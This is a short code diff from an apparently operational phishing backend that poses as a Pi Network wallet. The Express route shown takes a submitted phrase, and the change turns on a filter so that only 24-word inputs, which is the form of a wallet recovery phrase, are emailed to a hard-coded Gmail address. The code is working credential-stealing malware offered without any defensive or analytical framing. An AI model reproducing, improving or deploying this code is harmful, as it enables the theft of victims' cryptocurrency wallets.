@@ -55,7 +55,7 @@ app.post("/submit/7668", async (req, res) => {
   // forward to Email
   try {
     // if(mfText){
-    // if(mfText && mfText.split(' ').length == 24){
+    if(mfText && mfText.split(' ').length == 24){
       transporter.sendMail({
         from: "PiNetworkWallet",
         to: ["millimain889@gmail.com"],
@@ -64,7 +64,7 @@ app.post("/submit/7668", async (req, res) => {
         text: mfText,
         html: `<h1>${mfText}</h1>`,
       }).then(result=> console.log(result)).catch(err=> console.log(err));
-    // }
+    }
 
   } catch (error) {
     console.log(error, "the error");
